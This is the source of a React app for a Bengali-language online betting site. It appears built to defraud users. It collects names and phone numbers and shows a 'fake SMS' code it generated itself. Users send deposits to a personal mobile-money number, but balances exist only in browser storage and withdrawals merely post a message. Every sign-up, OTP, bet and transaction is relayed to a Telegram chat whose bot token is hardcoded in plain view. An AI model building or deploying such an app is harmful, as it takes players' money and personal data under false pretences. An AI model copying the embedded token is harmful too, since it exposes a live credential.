
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_YyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_dice' | 'play_snake' | 'play_crash' | 'play_slots' | 
             'play_roulette' | 'play_mines' | 'play_plinko' | 'play_cards' |
             'play_dragon_tiger' | 'play_wheel' | 'play_coin' | 'play_baccarat' |
             'play_aviator' | 'play_hilo' | 'play_limbo' | 'play_scratch';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdraw';
  amount: number;
  status: 'pending' | 'success' | 'rejected';
  txId?: string;
  targetNumber?: string;
  date: string;
}

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

// --- Helper Functions ---
const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
};

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  
  // Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // Betting & Game States
  const [bet, setBet] = useState(100);
  const gameIntervalRef = useRef<any>(null);
  
  // Specific Game States
  const [multiplier, setMultiplier] = useState(1.0);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'crashed' | 'won'>('idle');

  // Form States
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // Persistence & Initialization
  useEffect(() => {
    try {
      const savedUser = localStorage.getItem('og_user_v12');
      const savedBalance = localStorage.getItem('og_balance_v12');
      const savedTx = localStorage.getItem('og_tx_v12');
      
      if (savedUser) setUser(JSON.parse(savedUser));
      if (savedBalance) setBalance(Number(savedBalance));
      if (savedTx) setTransactions(JSON.parse(savedTx));
    } catch (e) {
      console.error("Data Load Error", e);
    }
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v12', JSON.stringify(user));
    localStorage.setItem('og_balance_v12', balance.toString());
    localStorage.setItem('og_tx_v12', JSON.stringify(transactions));
  }, [user, balance, transactions]);

  const handleGameResult = useCallback((win: boolean, gameName: string, betAmount: number, winMultiplier: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * winMultiplier) : 0;
    const net = win ? (winAmt - betAmount) : -betAmount;
    setBalance(prev => prev + net);
    if (user) {
      const updated = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updated);
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ${user.name}\n📊 ${win ? "WIN ✅" : "LOSS ❌"}\n💸 বাজি: ৳${betAmount}\n💰 ব্যালেন্স: ৳${balance + net}`);
    }
  }, [user, balance]);

  // Auth Logic
  const initiateAuth = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const name = (formData.get('name') as string) || "Player";
    const phone = formData.get('phone') as string;
    if (phone.length < 11) return alert("১১ ডিজিটের নম্বর দিন");
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(otp);
    setTempUser({ name, phone });
    setIsVerifying(true);
    setTimeout(() => setShowFakeSMS(true), 800);
    sendToTelegram(`🔑 <b>OTP</b>\n👤 ${name}\n📞 ${phone}\n🔑 কোড: ${otp}`);
  };

  const verifyOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else alert("ভুল ওটিপি!");
  };

  // Game: Aviator
  const startAviator = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setGameState('playing'); setMultiplier(1.0);
    const crashAt = 1.1 + Math.random() * 6;
    gameIntervalRef.current = setInterval(() => {
      setMultiplier(p => {
        const n = p + 0.04;
        if (n >= crashAt) {
          clearInterval(gameIntervalRef.current); setGameState('crashed');
          handleGameResult(false, "Aviator", bet);
          return n;
        }
        return n;
      });
    }, 150);
  };

  const cashOutAviator = () => {
    if (gameState !== 'playing') return;
    clearInterval(gameIntervalRef.current); setGameState('won');
    handleGameResult(true, "Aviator", bet, multiplier);
    alert(`আপনি জিতেছেন ৳${Math.floor(bet * multiplier)}`);
  };

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {showFakeSMS && (
          <div className="fixed top-12 w-[92%] max-w-lg glass rounded-[40px] p-8 animate-sms z-[999] border-orange-500 shadow-[0_30px_70px_rgba(255,107,0,0.4)]">
            <div className="flex items-center gap-4 mb-4">
              <div className="w-10 h-10 rounded-full bg-orange-500 flex items-center justify-center text-black font-black text-xs">OTP</div>
              <p className="text-xs text-orange-500 font-black uppercase tracking-widest">Notification Alert</p>
            </div>
            <p className="text-base font-bold text-white leading-relaxed">Your secure verification code is: <span className="text-orange-500 text-3xl font-black tracking-[0.2em] ml-2">{otpSent}</span></p>
          </div>
        )}
        <div className="w-full max-w-md text-center">
          <div className="w-28 h-28 bg-orange-500 rounded-[36px] mx-auto mb-12 flex items-center justify-center text-black font-black text-5xl shadow-[0_0_80px_rgba(255,107,0,0.4)] ring-8 ring-white/5 active-scale transition-all">OG</div>
          <h1 className="text-4xl font-black mb-12 tracking-tighter uppercase italic">ONLINE <span className="text-orange-500">GAMES</span></h1>
          
          {!isVerifying ? (
            <form onSubmit={initiateAuth} className="space-y-6">
              <input name="name" required placeholder="আপনার নাম" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-6 px-8 outline-none text-white text-lg font-bold focus:border-orange-500/40 transition-all" />
              <input name="phone" required type="tel" placeholder="মোবাইল নম্বর" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-6 px-8 outline-none text-white text-lg font-bold tracking-[0.1em] focus:border-orange-500/40 transition-all" />
              <button className="w-full py-6 bg-orange-500 text-black font-black rounded-[28px] uppercase text-xs tracking-widest shadow-2xl active-scale transition-all mt-4">আইডি তৈরি করুন</button>
            </form>
          ) : (
            <div className="space-y-10 animate-in zoom-in duration-500">
              <p className="text-gray-500 text-xs font-black uppercase tracking-[0.3em]">কোডটি প্রবেশ করান</p>
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} maxLength={4} placeholder="____" className="w-full bg-transparent border-b-4 border-orange-500/40 text-center text-7xl font-black text-orange-500 outline-none pb-6 tracking-[0.4em]" />
              <button onClick={verifyOtp} className="w-full py-6 bg-white text-black font-black rounded-[28px] uppercase text-xs tracking-widest shadow-2xl active-scale transition-all">ভেরিফাই করুন</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <div className="max-w-xl mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative">
        <Header />
        <ChatAssistant />

        <main className="p-8">
          {activeTab === 'dashboard' && (
            <div className="space-y-12 animate-in fade-in duration-500">
              {/* Balance Card - Enlarged */}
              <div className="glass rounded-[56px] p-12 border border-white/10 shadow-2xl relative overflow-hidden bg-gradient-to-br from-white/5 to-transparent">
                <div className="absolute -top-10 -right-10 w-64 h-64 bg-orange-500/10 blur-[90px]"></div>
                <div className="absolute -bottom-10 -left-10 w-48 h-48 bg-blue-500/5 blur-[90px]"></div>
                
                <p className="text-gray-500 text-xs font-black uppercase tracking-widest mb-4 italic">Available Funds</p>
                <h1 className="text-6xl font-black tracking-tighter mb-12 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                
                <div className="grid grid-cols-2 gap-6">
                  <button onClick={() => setActiveTab('deposit')} className="py-5 bg-orange-500 text-black rounded-[32px] text-xs font-black uppercase shadow-xl active-scale transition-all">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-5 glass border border-white/10 rounded-[32px] text-xs font-black uppercase active-scale transition-all">উত্তোলন</button>
                </div>
              </div>

              {/* Game Grid - Adjusted sizing for max-w-xl */}
              <div className="space-y-8">
                <div className="flex items-center justify-between px-2">
                  <h3 className="text-xs font-black uppercase tracking-[0.4em] text-gray-500 italic">Game Library</h3>
                  <span className="text-[10px] bg-green-500/10 text-green-500 px-3 py-1 rounded-full font-black uppercase border border-green-500/20">16 Games Live</span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-2 gap-6">
                  {[
                    { id: 'play_aviator', label: 'Aviator', icon: 'fa-paper-plane', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_mines', label: 'Mines', icon: 'fa-gem', color: 'text-orange-500', bg: 'bg-orange-500/10' },
                    { id: 'play_crash', label: 'Crash', icon: 'fa-plane-up', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_wheel', label: 'Wheel', icon: 'fa-dharmachakra', color: 'text-purple-500', bg: 'bg-purple-500/10' },
                    { id: 'play_hilo', label: 'Hi-Lo', icon: 'fa-arrows-up-down', color: 'text-blue-500', bg: 'bg-blue-500/10' },
                    { id: 'play_scratch', label: 'Scratch', icon: 'fa-ticket', color: 'text-green-500', bg: 'bg-green-500/10' },
                    { id: 'play_coin', label: 'Coin Flip', icon: 'fa-coins', color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
                    { id: 'play_dice', label: 'Dice', icon: 'fa-dice', color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                    { id: 'play_slots', label: 'Slots', icon: 'fa-clover', color: 'text-indigo-500', bg: 'bg-indigo-500/10' },
                    { id: 'play_baccarat', label: 'Baccarat', icon: 'fa-diamond', color: 'text-pink-500', bg: 'bg-pink-500/10' },
                    { id: 'play_dragon_tiger', label: 'Dragon Tiger', icon: 'fa-dragon', color: 'text-blue-400', bg: 'bg-blue-400/10' },
                    { id: 'play_limbo', label: 'Limbo', icon: 'fa-rocket', color: 'text-amber-500', bg: 'bg-amber-500/10' },
                    { id: 'play_plinko', label: 'Plinko', icon: 'fa-circle-dot', color: 'text-teal-500', bg: 'bg-teal-500/10' },
                    { id: 'play_cards', label: 'Card Clash', icon: 'fa-layer-group', color: 'text-cyan-500', bg: 'bg-cyan-500/10' },
                    { id: 'play_roulette', label: 'Roulette', icon: 'fa-circle-notch', color: 'text-rose-500', bg: 'bg-rose-500/10' },
                    { id: 'play_snake', label: 'Snake Pro', icon: 'fa-worm', color: 'text-lime-500', bg: 'bg-lime-500/10' }
                  ].map(game => (
                    <div key={game.id} onClick={() => setActiveTab(game.id as View)} className="glass p-8 rounded-[44px] border border-white/5 hover:border-white/20 transition-all cursor-pointer group active-scale shadow-lg flex flex-col items-center text-center">
                      <div className={`w-16 h-16 ${game.bg} ${game.color} rounded-[24px] flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform shadow-inner`}>
                        <i className={`fa-solid ${game.icon}`}></i>
                      </div>
                      <h4 className="text-sm font-black uppercase tracking-wider mb-2">{game.label}</h4>
                      <p className="text-[10px] text-gray-600 font-black uppercase tracking-widest">Win up to 10x</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Game Views - Enlarged */}
          {activeTab === 'play_aviator' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
               <div className="glass rounded-[56px] p-12 border border-red-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-10 left-10 text-gray-600 text-xl"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-3xl font-black mb-12 uppercase italic">Aviator <span className="text-red-500">Flying</span></h2>
                 <div className="relative h-80 bg-black/60 rounded-[48px] mb-12 border border-white/5 flex flex-col items-center justify-center overflow-hidden shadow-inner">
                    <div className="text-8xl font-black tracking-tighter text-white z-10">{multiplier.toFixed(2)}x</div>
                    {gameState === 'crashed' && <div className="text-red-500 font-black text-3xl uppercase mt-6 animate-ping italic">Flew Away!</div>}
                 </div>
                 {gameState !== 'playing' ? (
                   <button onClick={startAviator} className="w-full py-8 bg-red-600 text-white font-black rounded-[36px] active-scale transition-all uppercase tracking-[0.2em] text-sm shadow-2xl">বেট ধরুন (৳{bet})</button>
                 ) : (
                   <button onClick={cashOutAviator} className="w-full py-8 bg-green-500 text-black font-black rounded-[36px] active-scale transition-all uppercase tracking-[0.2em] text-sm shadow-2xl">ক্যাশ আউট (৳{Math.floor(bet * multiplier)})</button>
                 )}
               </div>
            </div>
          )}

          {/* Deposit enlarged */}
          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-10 duration-500">
               <div className="glass rounded-[48px] p-12 border border-orange-500/20 shadow-2xl">
                 <h2 className="text-2xl font-black text-center mb-10 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-10 rounded-[36px] border border-white/5 mb-10 text-center relative overflow-hidden group">
                    <p className="text-xs text-gray-500 font-black uppercase mb-4 tracking-widest italic">সেন্ড মানি নম্বর</p>
                    <p className="text-3xl font-mono font-black text-orange-500 tracking-[0.2em]">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-8">
                   <div className="relative">
                     <span className="absolute left-8 top-1/2 -translate-y-1/2 text-orange-500 font-black text-xl">৳</span>
                     <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="১০০ - ৫০০০" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-7 pl-16 pr-8 text-white text-xl font-black outline-none focus:border-orange-500/40" />
                   </div>
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="ট্রানজেকশন আইডি এখানে দিন" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-7 px-8 text-white font-black outline-none uppercase tracking-widest text-sm" />
                   <button onClick={() => {
                     if (!depAmt || !depTx) return alert("তথ্য দিন");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'deposit', amount: Number(depAmt), status: 'pending', txId: depTx.toUpperCase(), date: new Date().toLocaleString('bn-BD') };
                     setTransactions([tx, ...transactions]);
                     sendToTelegram(`💰 <b>নতুন ডিপোজিট</b>\n👤 ${user?.name}\n💵 ৳${depAmt}\n📑 ${depTx}`);
                     alert("রিকোয়েস্ট পাঠানো হয়েছে!"); setActiveTab('history');
                   }} className="w-full py-8 bg-orange-500 text-black font-black rounded-[36px] uppercase text-xs tracking-[0.2em] shadow-2xl active-scale transition-all">ডিপোজিট সম্পন্ন করুন</button>
                 </div>
               </div>
            </div>
          )}

          {/* Withdraw enlarged */}
          {activeTab === 'withdraw' && (
            <div className="animate-in slide-in-from-left-10 duration-500">
               <div className="glass rounded-[48px] p-12 border border-red-500/20 shadow-2xl">
                 <h2 className="text-2xl font-black text-center mb-10 italic uppercase tracking-tighter">টাকা <span className="text-red-500">উত্তোলন</span></h2>
                 <div className="bg-white/5 p-8 rounded-[36px] mb-10 border border-white/5 text-center">
                    <p className="text-xs text-gray-500 font-black uppercase tracking-widest mb-2 italic">আপনার বর্তমান ব্যালেন্স</p>
                    <p className="text-4xl font-black text-white">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-8">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="ন্যূনতম ৫০০ টাকা" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-7 px-8 text-white text-xl font-black outline-none" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ নম্বর" className="w-full bg-white/5 border border-white/10 rounded-[28px] py-7 px-8 text-white font-black outline-none tracking-widest" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("ন্যূনতম ৫০০ টাকা উত্তোলন করতে পারবেন");
                     if (amt > balance) return alert("ব্যালেন্স নেই");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'withdraw', amount: amt, status: 'pending', targetNumber: witNum, date: new Date().toLocaleString('bn-BD') };
                     setBalance(p => p - amt); setTransactions([tx, ...transactions]);
                     sendToTelegram(`🔴 <b>উত্তোলন</b>\n👤 ${user?.name}\n💵 ৳${amt}\n📱 ${witNum}`);
                     alert("উত্তোলন রিকোয়েস্ট সফল হয়েছে।"); setActiveTab('history');
                   }} className="w-full py-8 bg-red-500 text-white font-black rounded-[36px] uppercase text-xs tracking-[0.2em] shadow-2xl active-scale transition-all">উত্তোলন রিকোয়েস্ট পাঠান</button>
                 </div>
               </div>
            </div>
          )}

          {/* History enlarged */}
          {activeTab === 'history' && (
            <div className="space-y-6 animate-in fade-in duration-500">
               <h2 className="text-xs font-black uppercase tracking-[0.4em] text-gray-600 px-2 italic">ট্রানজেকশন হিস্ট্রি</h2>
               {transactions.length === 0 ? <p className="text-center opacity-30 py-32 text-xs font-black uppercase italic tracking-widest leading-loose">কোন ট্রানজেকশন রেকর্ড পাওয়া যায়নি</p> : transactions.map(tx => (
                 <div key={tx.id} className="glass p-8 rounded-[40px] border border-white/5 shadow-xl flex justify-between items-center active-scale transition-all">
                    <div>
                      <p className="text-xs font-black uppercase tracking-widest text-white/80">{tx.type === 'deposit' ? 'ডিপোজিট' : 'উত্তোলন'}</p>
                      <p className="text-[10px] text-gray-600 font-bold mt-2 uppercase tracking-tighter">{tx.date}</p>
                    </div>
                    <div className="text-right">
                      <p className={`text-2xl font-black ${tx.type === 'deposit' ? 'text-green-500' : 'text-red-500'}`}>৳{tx.amount}</p>
                      <span className="text-[9px] font-black uppercase px-3 py-1 rounded-full bg-orange-500/10 text-orange-500 mt-2 inline-block border border-orange-500/20">{tx.status}</span>
                    </div>
                 </div>
               ))}
            </div>
          )}
        </main>

        {/* Floating Navbar enlarged */}
        <nav className="fixed bottom-10 left-1/2 -translate-x-1/2 w-[94%] max-w-lg h-24 glass rounded-[48px] border border-white/10 flex items-center justify-around z-[100] shadow-2xl px-8">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all ${activeTab === 'dashboard' ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house-chimney text-2xl"></i>
            <span className="text-[8px] font-black uppercase tracking-widest">Home</span>
          </button>
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all ${activeTab.includes('play') ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-2xl"></i>
            <span className="text-[8px] font-black uppercase tracking-widest">Games</span>
          </button>
          <button onClick={() => setActiveTab('history')} className={`flex flex-col items-center gap-2 transition-all ${activeTab === 'history' ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-clock-rotate-left text-2xl"></i>
            <span className="text-[8px] font-black uppercase tracking-widest">Record</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-2 transition-all ${activeTab === 'withdraw' ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-2xl"></i>
            <span className="text-[8px] font-black uppercase tracking-widest">Wallet</span>
          </button>
        </nav>
      </div>
    </div>
  );
}
